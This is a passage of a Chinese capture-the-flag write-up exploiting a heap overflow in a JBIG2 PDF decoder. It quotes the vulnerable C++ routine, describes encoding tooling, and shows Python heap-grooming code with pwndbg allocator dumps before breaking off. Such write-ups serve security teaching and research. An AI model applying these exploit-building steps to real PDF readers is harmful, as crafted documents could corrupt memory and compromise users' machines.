class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">void JBIG2Stream::readTextRegionSeg(Guint segNum, GBool imm,</span><br><span class="line">                                    GBool lossless, Guint length,</span><br><span class="line">                                    Guint *refSegs, Guint nRefSegs)</span><br><span class="line">&#123;</span><br><span class="line">    [...]</span><br><span class="line">    &#x2F;&#x2F; get the symbol bitmaps</span><br><span class="line">    &#x2F;&#x2F; 从所引用的每个段上，将每个 instance 拷贝到 syms 数组中</span><br><span class="line">    syms &#x3D; (JBIG2Bitmap **)gmallocn(numSyms, sizeof(JBIG2Bitmap *));</span><br><span class="line">    kk &#x3D; 0;</span><br><span class="line">    for (i &#x3D; 0; i &lt; nRefSegs; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        if ((seg &#x3D; findSegment(refSegs[i])))</span><br><span class="line">        &#123;</span><br><span class="line">            if (seg-&gt;getType() &#x3D;&#x3D; jbig2SegSymbolDict)</span><br><span class="line">            &#123;</span><br><span class="line">                symbolDict &#x3D; (JBIG2SymbolDict *)seg;</span><br><span class="line">                for (k &#x3D; 0; k &lt; symbolDict-&gt;getSize(); ++k)</span><br><span class="line">                &#123;</span><br><span class="line">                    syms[kk++] &#x3D; symbolDict-&gt;getBitmap(k);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">    &#x2F;&#x2F; 执行 readTextRegion 函数，将指定的 syms 与新创建出来的 bitmap 进行 combine 操作</span><br><span class="line">    bitmap &#x3D; readTextRegion(huff, refine, w, h, numInstances,</span><br><span class="line">                            logStrips, numSyms, symCodeTab, symCodeLen, syms,</span><br><span class="line">                            defPixel, combOp, transposed, refCorner, sOffset,</span><br><span class="line">                            huffFSTable, huffDSTable, huffDTTable,</span><br><span class="line">                            huffRDWTable, huffRDHTable,</span><br><span class="line">                            huffRDXTable, huffRDYTable, huffRSizeTable,</span><br><span class="line">                            templ, atx, aty);</span><br><span class="line"></span><br><span class="line">    gfree(syms);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; combine the region bitmap into the page bitmap</span><br><span class="line">    &#x2F;&#x2F; 将当前 bitmap 与 pageBitmap 进行 combine 操作，传递所引用的 instance 上的值至 pageBitmap 上</span><br><span class="line">    if (imm)</span><br><span class="line">    &#123;</span><br><span class="line">        if (pageH &#x3D;&#x3D; 0xffffffff &amp;&amp; y + h &gt; curPageH)</span><br><span class="line">        &#123;</span><br><span class="line">            pageBitmap-&gt;expand(y + h, pageDefPixel);</span><br><span class="line">        &#125;</span><br><span class="line">        pageBitmap-&gt;combine(bitmap, x, y, extCombOp);</span><br><span class="line">        delete bitmap;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; store the region bitmap</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        bitmap-&gt;setSegNum(segNum);</span><br><span class="line">        segments-&gt;append(bitmap);</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-JBIG2Encode"><a href="#3-JBIG2Encode" class="headerlink" title="3. JBIG2Encode"></a>3. JBIG2Encode</h3><h3 id="a-encode-Bitmap"><a href="#a-encode-Bitmap" class="headerlink" title="a. encode Bitmap"></a>a. encode Bitmap</h3><p>通过阅读上面关于 Segments 的源代码，我们可以很容易的得知：在诸如 <code>readGenericBitmap</code> 等读入 bitmap 的函数中，hso 会尝试<strong>从外部 JBIG2Stream 流中，使用某种解码器来对读入的 bitmap 进行解码</strong>（例如代码中多次出现 <code>arithDecoder-&gt;decodeInt</code> 等调用）。</p><p>因此，作为提供外部 JBIG2Stream 流的我们，需要对写入至 pdf 中的 bitmap 做对应的编码操作。</p><p>从最上面的 <code>JBIG2Stream::reset</code> 函数中可以得知，一共由三种解码器：</p><ul><li><strong>JArithmeticDecoder</strong></li><li>JBIG2HuffmanDecoder</li><li>JBIG2MMRDecoder</li></ul><p>而这些解码器的内部算法，如果要让我们徒手撸一个的话 ，那么做题效率就会非常低。因此，我们可以<strong>使用 <code>jbig2enc</code> 库</strong>来帮助我们完成数据编码操作，该库已经实现了 <strong>JArithmeticDecoder</strong> 状态机的编码算法，故我们无需了解内部细节即可完成对 bitmap 的编码过程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:agl&#x2F;jbig2enc.git</span><br></pre></td></tr></table></figure><p>但是，该库是使用 C++ 编写的，若 exploit 也全部使用 C++ 完成，则工作量较高。因此，我们可以使用 pybind11 来暴露 jbig2enc 中的部分接口给 python，这样编写 exploit 时可以使用 python 语言来完成。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install pybind11-dev</span><br></pre></td></tr></table></figure><p>最后需要注意的是，由于 <code>jbig2enc</code> 的接口会<strong>使用到大量的指针</strong>，而<strong>将指针暴露给 python 接口调用</strong>是一个非常不明智的选择（因为如果让 python 来调用需要指针的接口，则会降低开发速度和<strong>提高触发 bug 的几率</strong>），因此我们最好根据当前的需求，即：</p><blockquote><p>将 bitmap 数据以 JArithmeticDecoder 方式来进行编码。</p></blockquote><p>来额外编写一个 wrapper C++ 代码，实现三个封装好的结构体/枚举：</p><ul><li><code>ArithEncoder</code>：调用 jbig2enc 对 bitmap 进行编码的类</li><li><code>Bitmap</code>：待被编码的 bitmap 数据</li><li><code>ArithEncoder::Proc</code>：<code>ArithEncoder</code> 编码器的状态枚举</li></ul><p>最后将这三个结构体/枚举 暴露给 python 调用，避免让 python 直接操作指针。</p><blockquote><p>这一小节所实现的代码，正对应于 exp 中的以下几个文件：</p><ul><li><code>hso-groupie/exploit/jbig2arith.[cc,h]</code></li><li><code>hso-groupie/exploit/jbjbarith.[cc,h]</code></li></ul></blockquote><h3 id="b-encode-segments"><a href="#b-encode-segments" class="headerlink" title="b. encode segments"></a>b. encode segments</h3><p>hso 在 read segments 时，首先会读取出每个当前 segment 的 段号 segNum、segFlags、refFlags 等一系列字段和标志，之后才是进行（可能的） bitmap 读取。</p><p>这些字段和标志同样是需要我们手动放进 JBIG2Stream 中。由于这里的字段和标志不需要使用解码器进行解码，因此可以手动编写代码将字段一个个放置进流中。</p><p>这一步的操作位于 exp 中的 <code>hso-groupie/exploit/jbig2.py</code> ，该脚本为所有用到的 segment 都编写了一个对应的 <strong>python 结构转 JBIG2Stream 字节流</strong>的操作；同时，上一节中暴露给 python 所调用的 bitmap encoder 接口，也是在该脚本中所使用。</p><p>这样，当我们使用 python 设计好一个个特定的 segments 后，我们便可以将这些 segments 快速转换成 JBIG2Stream 流数据，方便快捷。</p><h2 id="五、漏洞利用流程"><a href="#五、漏洞利用流程" class="headerlink" title="五、漏洞利用流程"></a>五、漏洞利用流程</h2><h3 id="1-堆风水"><a href="#1-堆风水" class="headerlink" title="1. 堆风水"></a>1. 堆风水</h3><h3 id="a-创建堆空洞"><a href="#a-创建堆空洞" class="headerlink" title="a. 创建堆空洞"></a>a. 创建堆空洞</h3><p>先放上这张镇楼图：</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2022-02-10-095544.jpg" alt=""></p><p>为了利用这个堆溢出漏洞，我们需要充分发动堆风水，将指定的结构放至对应的堆块。这里，我们的堆风水需要完成以下几个目标：</p><ul><li><p>让 pdf 在解析 TextRegionSeg 时，其创建的 syms 指针数组位于 <code>undersized syms buffer</code> 处</p></li><li><p>让内含<strong>存放超多指针的 JBIG2SymbolDict 结构体</strong>的 segment 放置在 <code>segments GList backing buffer</code> 处</p><blockquote><p>这里，我们打算让 JBIG2SymbolDict 结构体存放至 global segment 中，因为 SymbolDictSegment 不依赖与任何的 Segments，但是后续的 TextRegionSegment 会依赖这些 SymbolDictSegment。</p></blockquote></li><li><p>让 pageBitmap 结构体占据图中 <code>JBIG2Bitmap</code> 那块内存，并让其 data 占据图中上面 <code>bitmap backing buffer</code> 那块内存。</p><blockquote><p>通读代码，我们可以得知绝大多数 segments 在解析时，都可以让其 bitmap 与 pageBitmap 进行运算，并将结果保存在 pageBitmap 上。因此让 pageBitmap 拥有越界读写的能力是最好的选择。</p></blockquote></li></ul><p>我们先尝试在 global segment 中分配三个不同 Bitmap 大小的 SymbolDict 出来。这里分配不同大小的 SymbolDict 是为了后续在 TextRegionSeg 中，排列组合 size 至溢出，因此这三个堆块的位置<strong>不需要关心</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># global segment</span><br><span class="line">global_file &#x3D; [</span><br><span class="line">    SymbolDict(0, [Bitmap(1, 1)] * 0x10000),</span><br><span class="line">    SymbolDict(1, [Bitmap(1, 1)] * (size_to_overflow &#x2F;&#x2F; 8)),</span><br><span class="line">    SymbolDict(2, [Bitmap(1, 1)]),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><blockquote><p>其中 size_to_overflow 为上图中 overflow 的字节数，具体计算过程稍后介绍。</p></blockquote><p>此时我们看看分配完这三个 SymbolDict 后的 bins 是什么情况，可以看到<strong>有大量的碎片堆块</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x20 [  4]: 0x55555579f8e0 —▸ 0x5555557b9550 —▸ 0x5555557b0c10 —▸ 0x5555557b0c60 ◂— 0x0</span><br><span class="line">0x30 [  5]: 0x5555557ab330 —▸ 0x5555557b0c30 —▸ 0x5555557b0c80 —▸ 0x555555799280 —▸ 0x5555557992d0 ◂— 0x0</span><br><span class="line">0x40 [  7]: 0x5555557f7f90 —▸ 0x5555557f8f10 —▸ 0x5555557f9100 —▸ 0x5555557f7bb0 —▸ 0x5555557fe710 —▸ 0x5555557a0320 —▸ 0x555555797210 ◂— 0x0</span><br><span class="line">0x50 [  1]: 0x5555557a02b0 ◂— 0x0</span><br><span class="line">0x60 [  4]: 0x5555557ab3c0 —▸ 0x5555557a9e40 —▸ 0x5555557ab890 —▸ 0x5555557ab790 ◂— 0x0</span><br><span class="line">0x70 [  1]: 0x5555557ac760 ◂— 0x0</span><br><span class="line">0x90 [  1]: 0x5555557b94c0 ◂— 0x0</span><br><span class="line">0xa0 [  3]: 0x555555798e00 —▸ 0x5555557b6930 —▸ 0x5555557b6a10 ◂— 0x0</span><br><span class="line">0xb0 [  2]: 0x5555557ba520 —▸ 0x5555557b9410 ◂— 0x0</span><br><span class="line">0xc0 [  3]: 0x5555557bec00 —▸ 0x5555557bf620 —▸ 0x5555557b1220 ◂— 0x0</span><br><span class="line">0xd0 [  5]: 0x555555799ec0 —▸ 0x5555557b0cb0 —▸ 0x5555557c5400 —▸ 0x5555557c37f0 —▸ 0x5555557bfcf0 ◂— 0x0</span><br><span class="line">0xe0 [  3]: 0x5555557be4b0 —▸ 0x5555557a9a30 —▸ 0x5555557bc750 ◂— 0x0</span><br><span class="line">0xf0 [  3]: 0x5555557c6d30 —▸ 0x5555557bd370 —▸ 0x5555557bd4a0 ◂— 0x0</span><br><span class="line">0x100 [  2]: 0x5555557c4360 —▸ 0x5555557c44a0 ◂— 0x0</span><br><span class="line">0x110 [  1]: 0x555555797100 ◂— 0x0</span><br><span class="line">0x120 [  2]: 0x5555557c1000 —▸ 0x5555557c5880 ◂— 0x0</span><br><span class="line">0x140 [  3]: 0x5555557c7c80 —▸ 0x5555557c7430 —▸ 0x5555557cc180 ◂— 0x0</span><br><span class="line">0x150 [  3]: 0x5555557cdac0 —▸ 0x5555557c83f0 —▸ 0x5555557c8590 ◂— 0x0</span><br><span class="line">0x160 [  2]: 0x55555579fc00 —▸ 0x5555557a4420 ◂— 0x0</span><br><span class="line">0x170 [  3]: 0x555555797c20 —▸ 0x5555557d36c0 —▸ 0x5555557d3550 ◂— 0x0</span><br><span class="line">0x180 [  2]: 0x5555557bff50 —▸ 0x5555557d8010 ◂— 0x0</span><br><span class="line">0x190 [  7]: 0x5555557adb80 —▸ 0x5555557d8530 —▸ 0x5555557ad570 —▸ 0x5555557ac7d0 —▸ 0x5555557a8710 —▸ 0x5555557a8d60 —▸ 0x5555557aad00 ◂— 0x0</span><br><span class="line">0x1a0 [  2]: 0x5555557d2890 —▸ 0x5555557ad700 ◂— 0x0</span><br><span class="line">0x1b0 [  2]: 0x5555557a8ef0 —▸ 0x5555557aea50 ◂— 0x0</span><br><span class="line">0x1c0 [  2]: 0x5555557d1bb0 —▸ 0x55555579ad70 ◂— 0x0</span><br><span class="line">0x1d0 [  2]: 0x555555796b00 —▸ 0x555555796640 ◂— 0x0</span><br><span class="line">0x1f0 [  2]: 0x5555557a6410 —▸ 0x5555557a6220 ◂— 0x0</span><br><span class="line">0x200 [  2]: 0x55555576a670 —▸ 0x5555557aae90 ◂— 0x0</span><br><span class="line">0x220 [  2]: 0x5555557d8310 —▸ 0x5555557ac960 ◂— 0x0</span><br><span class="line">0x230 [  1]: 0x5555557bd980 ◂— 0x0</span><br><span class="line">0x270 [  1]: 0x5555557ba6d0 ◂— 0x0</span><br><span class="line">0x2b0 [  1]: 0x5555557abdc0 ◂— 0x0</span><br><span class="line">0x2c0 [  1]: 0x555555798320 ◂— 0x0</span><br><span class="line">0x2e0 [  1]: 0x5555557aa730 ◂— 0x0</span><br><span class="line">0x300 [  2]: 0x5555557a5c60 —▸ 0x5555557a9590 ◂— 0x0</span><br><span class="line">0x310 [  7]: 0x5555557ae510 —▸ 0x5555557ac110 —▸ 0x5555557ad010 —▸ 0x5555557abab0 —▸ 0x5555557a9280 —▸ 0x5555557aa420 —▸ 0x5555557a76c0 ◂— 0x0</span><br><span class="line">0x320 [  3]: 0x555555799f90 —▸ 0x5555557becc0 —▸ 0x5555557bab30 ◂— 0x0</span><br><span class="line">0x350 [  2]: 0x5555557bcb40 —▸ 0x5555557c3bd0 ◂— 0x0</span><br><span class="line">0x390 [  1]: 0x5555557a88a0 ◂— 0x0</span><br><span class="line">0x3b0 [  2]: 0x555555797250 —▸ 0x5555557a79d0 ◂— 0x0</span><br><span class="line">0x3c0 [  1]: 0x5555557d39d0 ◂— 0x0</span><br><span class="line">0x3d0 [  1]: 0x5555557cccc0 ◂— 0x0</span><br><span class="line">0x400 [  1]: 0x55555576aa50 ◂— 0x0</span><br><span class="line">0x410 [  3]: 0x555555797810 —▸ 0x5555557bf1d0 —▸ 0x5555557a7f90 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555558304b0 —▸ 0x7ffff7ad8c00 (main_arena+96) ◂— 0x5555558304b0</span><br><span class="line">smallbins</span><br><span class="line">0x20: 0x5555557a99e0 —▸ 0x7ffff7ad8c10 (main_arena+112) ◂— 0x5555557a99e0</span><br><span class="line">0xb0: 0x5555557f82f0 —▸ 0x7ffff7ad8ca0 (main_arena+256) ◂— 0x5555557f82f0</span><br><span class="line">0xf0: 0x5555557d0ab0 —▸ 0x7ffff7ad8ce0 (main_arena+320) ◂— 0x5555557d0ab0</span><br><span class="line">0x120: 0x5555557992f0 —▸ 0x7ffff7ad8d10 (main_arena+368) ◂— 0x5555557992f0</span><br><span class="line">0x190: 0x5555557f7df0 —▸ 0x5555557f8d70 —▸ 0x5555557f8f60 —▸ 0x5555557f7a10 —▸ 0x5555557fe570 ◂— ...</span><br><span class="line">0x1c0 [corrupted]</span><br><span class="line">FD: 0x5555557f1a30 —▸ 0x5555557f4780 —▸ 0x5555557d15f0 —▸ 0x5555557e49d0 —▸ 0x55555579ecf0 ◂— ...</span><br><span class="line">BK: 0x5555557d0c90 —▸ 0x5555557d06f0 —▸ 0x5555557d1410 —▸ 0x5555557d0e70 —▸ 0x55555579e390 ◂— ...</span><br><span class="line">0x1d0 [corrupted]</span><br><span class="line">FD: 0x5555557f9910 —▸ 0x5555557f9720 —▸ 0x5555557f85b0 —▸ 0x5555557fe960 —▸ 0x5555557f66b0 ◂— ...</span><br><span class="line">BK: 0x5555557f9530 —▸ 0x5555557f9150 —▸ 0x5555557fb050 —▸ 0x5555557fdd90 —▸ 0x5555557fd1e0 ◂— ...</span><br><span class="line">0x1e0 [corrupted]</span><br><span class="line">FD: 0x5555557a13c0 —▸ 0x5555557a0bc0 —▸ 0x5555557a11c0 —▸ 0x5555557a0570 —▸ 0x5555557a0770 ◂— ...</span><br><span class="line">BK: 0x5555557fcbf0 —▸ 0x5555557fc9f0 —▸ 0x5555557fdb90 —▸ 0x5555557fe760 —▸ 0x5555557fc210 ◂— ...</span><br><span class="line">0x1f0: 0x5555557ba930 —▸ 0x5555557f1120 —▸ 0x5555557d19b0 —▸ 0x5555557befd0 —▸ 0x7ffff7ad8de0 (main_arena+576) ◂— ...</span><br><span class="line">0x200: 0x5555557a9b00 —▸ 0x5555557df570 —▸ 0x5555557a8500 —▸ 0x7ffff7ad8df0 (main_arena+592) ◂— 0x5555557a9b00</span><br><span class="line">0x220 [corrupted]</span><br><span class="line">FD: 0x5555557f3c20 —▸ 0x5555557ecce0 —▸ 0x5555557e8180 —▸ 0x5555557f57f0 —▸ 0x5555557ee5a0 ◂— ...</span><br><span class="line">BK: 0x5555557f4540 —▸ 0x5555557f2130 —▸ 0x5555557f27e0 —▸ 0x5555557eec60 —▸ 0x5555557f2ea0 ◂— ...</span><br><span class="line">0x230 [corrupted]</span><br><span class="line">FD: 0x5555557ae810 —▸ 0x5555557f49d0 —▸ 0x5555557e2710 —▸ 0x5555557f4c20 —▸ 0x5555557a0970 ◂— ...</span><br><span class="line">BK: 0x5555557f0a20 —▸ 0x5555557a23a0 —▸ 0x5555557e5a20 —▸ 0x5555557a3d20 —▸ 0x5555557a3f70 ◂— ...</span><br><span class="line">0x240 [corrupted]</span><br><span class="line">FD: 0x5555557f5590 —▸ 0x5555557f1330 —▸ 0x5555557e3730 —▸ 0x5555557f4e70 —▸ 0x5555557a1ef0 ◂— ...</span><br><span class="line">BK: 0x5555557ec840 —▸ 0x5555557f50d0 —▸ 0x5555557a4660 —▸ 0x5555557e4090 —▸ 0x5555557f5330 ◂— ...</span><br><span class="line">0x250: 0x55555579a760 —▸ 0x7ffff7ad8e40 (main_arena+672) ◂— 0x55555579a760</span><br><span class="line">0x270 [corrupted]</span><br><span class="line">FD: 0x5555557dd3a0 —▸ 0x5555557e1a10 —▸ 0x5555557e0810 —▸ 0x5555557e02e0 —▸ 0x5555557e0aa0 ◂— ...</span><br><span class="line">BK: 0x5555557a54a0 —▸ 0x5555557a5210 —▸ 0x5555557e1f40 —▸ 0x5555557e0aa0 —▸ 0x5555557e02e0 ◂— ...</span><br><span class="line">0x280 [corrupted]</span><br><span class="line">FD: 0x5555557c7560 —▸ 0x5555557b0d70 —▸ 0x5555557e0570 —▸ 0x5555557df2d0 —▸ 0x5555557df810 ◂— ...</span><br><span class="line">BK: 0x5555557e21d0 —▸ 0x5555557deaf0 —▸ 0x5555557df030 —▸ 0x5555557e2470 —▸ 0x5555557ded90 ◂— ...</span><br><span class="line">0x290: 0x5555557acb70 —▸ 0x5555557ddb10 —▸ 0x5555557e0030 —▸ 0x5555557e1760 —▸ 0x5555557de5a0 ◂— ...</span><br><span class="line">0x2a0: 0x5555557dfd70 —▸ 0x5555557dfab0 —▸ 0x7ffff7ad8e90 (main_arena+752) ◂— 0x5555557dfd70</span><br><span class="line">0x2c0: 0x5555557a5f50 —▸ 0x5555557f5c90 —▸ 0x7ffff7ad8eb0 (main_arena+784) ◂— 0x5555557a5f50 &#x2F;* &#39;P_zUUU&#39; *&#x2F;</span><br><span class="line">0x340: 0x5555557f5f70 —▸ 0x5555557ac410 —▸ 0x7ffff7ad8f30 (main_arena+912) ◂— 0x5555557f5f70</span><br><span class="line">0x380: 0x5555557c69a0 —▸ 0x7ffff7ad8f70 (main_arena+976) ◂— 0x5555557c69a0</span><br><span class="line">0x390: 0x5555557d7c70 —▸ 0x7ffff7ad8f80 (main_arena+992) ◂— 0x5555557d7c70 &#x2F;* &#39;p|&#125;UUU&#39; *&#x2F;</span><br><span class="line">0x3b0: 0x5555557c54c0 —▸ 0x7ffff7ad8fa0 (main_arena+1024) ◂— 0x5555557c54c0</span><br><span class="line">0x3f0: 0x5555557bd580 —▸ 0x7ffff7ad8fe0 (main_arena+1088) ◂— 0x5555557bd580</span><br><span class="line">largebins</span><br><span class="line">0x580: 0x5555557cc2b0 —▸ 0x555555797d80 —▸ 0x7ffff7ad9050 (main_arena+1200) ◂— 0x5555557cc2b0</span><br><span class="line">0x600: 0x5555557c7db0 —▸ 0x7ffff7ad9070 (main_arena+1232) ◂— 0x5555557c7db0</span><br><span class="line">0x640: 0x5555557be580 —▸ 0x7ffff7ad9080 (main_arena+1248) ◂— 0x5555557be580</span><br><span class="line">0x780: 0x5555557ea9f0 —▸ 0x5555557cb9e0 —▸ 0x7ffff7ad90d0 (main_arena+1328) ◂— 0x5555557ea9f0</span><br><span class="line">0x800: 0x5555557985d0 —▸ 0x7ffff7ad90f0 (main_arena+1360) ◂— 0x5555557985d0</span><br><span class="line">0x840: 0x5555557cdc00 —▸ 0x7ffff7ad9100 (main_arena+1376) ◂— 0x5555557cdc00</span><br><span class="line">0x900: 0x5555557bdba0 —▸ 0x7ffff7ad9130 (main_arena+1424) ◂— 0x5555557bdba0</span><br><span class="line">0x940: 0x5555557e77f0 —▸ 0x5555557e9b00 —▸ 0x7ffff7ad9140 (main_arena+1440) ◂— 0x5555557e77f0</span><br><span class="line">0x980: 0x5555557d86b0 —▸ 0x5555557ebea0 —▸ 0x7ffff7ad9150 (main_arena+1456) ◂— 0x5555557d86b0</span><br><span class="line">0x9c0: 0x555555795c40 —▸ 0x7ffff7ad9160 (main_arena+1472) ◂— 0x555555795c40 &#x2F;* &#39;@\\yUUU&#39; *&#x2F;</span><br><span class="line">0xa00: 0x5555557cd080 —▸ 0x7ffff7ad9170 (main_arena+1488) ◂— 0x5555557cd080</span><br><span class="line">0xa40: 0x555555799440 —▸ 0x5555557d1e40 —▸ 0x7ffff7ad9180 (main_arena+1504) ◂— 0x555555799440</span><br><span class="line">0xac0: 0x5555557e83c0 —▸ 0x5555557e6100 —▸ 0x7ffff7ad91a0 (main_arena+1536) ◂— 0x5555557e83c0</span><br><span class="line">0xb00: 0x5555557d2a20 —▸ 0x7ffff7ad91b0 (main_arena+1552) ◂— 0x5555557d2a20 &#x2F;* &#39; *&#125;UUU&#39; *&#x2F;</span><br><span class="line">0xb40: 0x5555557e6c70 —▸ 0x5555557feb50 —▸ 0x7ffff7ad91c0 (main_arena+1568) ◂— 0x5555557e6c70 &#x2F;* &#39;pl~UUU&#39; *&#x2F;</span><br><span class="line">0xc40: 0x5555557eb210 —▸ 0x5555557e8ea0 —▸ 0x7ffff7ad9200 (main_arena+1632) ◂— 0x5555557eb210</span><br><span class="line">0xe00: 0x5555557c00c0 —▸ 0x5555557b9630 —▸ 0x5555557c4590 —▸ 0x7ffff7ad9210 (main_arena+1648) ◂— 0x5555557c00c0</span><br><span class="line">0x1400: 0x5555557b5420 —▸ 0x7ffff7ad9240 (main_arena+1696) ◂— 0x5555557b5420 &#x2F;* &#39; T&#123;UUU&#39; *&#x2F;</span><br><span class="line">0x1600: 0x5555557ce770 —▸ 0x7ffff7ad9250 (main_arena+1712) ◂— 0x5555557ce770</span><br><span class="line">0x1800: 0x5555557bae40 —▸ 0x7ffff7ad9260 (main_arena+1728) ◂— 0x5555557bae40</span><br><span class="line">0x2600: 0x5555557b6aa0 —▸ 0x5555557c1110 —▸ 0x7ffff7ad92d0 (main_arena+1840) ◂— 0x5555557b6aa0</span><br><span class="line">0x2a00: 0x55555579af20 —▸ 0x7ffff7ad92f0 (main_arena+1872) ◂— 0x55555579af20</span><br><span class="line">0x3000: 0x5555557d3d80 —▸ 0x5555557d9b60 —▸ 0x5555557c88a0 —▸ 0x7ffff7ad9300 (main_arena+1888) ◂— 0x5555557d3d80</span><br></pre></td></tr></table></figure><p>这些碎片堆块对于接下来的堆风水是相当不利的，因此需要将其全部分配掉。这里使用的是 <code>PageInfoSeg</code> 来分配内存，因为通读代码可以发现 <code>JBIG2Stream::readPageInfoSeg</code> 函数<strong>除了分配一个堆块以外，没有产生其他任何影响</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def DummyAlloc(size):</span><br><span class="line">    return PageInfo(233, w&#x3D;8, h&#x3D;size)</span><br><span class="line"></span><br><span class="line">global_file &#x3D; [</span><br><span class="line">    SymbolDict(0, [Bitmap(1, 1)] * 0x10000),</span><br><span class="line">    SymbolDict(1, [Bitmap(1, 1)] * (size_to_overflow &#x2F;&#x2F; 8)),</span><br><span class="line">    SymbolDict(2, [Bitmap(1, 1)]),</span><br><span class="line">    # Heap grooming: eat every chunk in &#123;tcache,fast,small,large,unsorted&#125; bins</span><br><span class="line">    [[DummyAlloc(size)] * 128 for size in range(0x10, 0x1000, 0x10)],</span><br><span class="line">    [[DummyAlloc(size)] * 16 for size in range(0x1000, 0x10000, 0x100)],</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>分配后的 bin 如下所示，可以看到清爽了不少：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 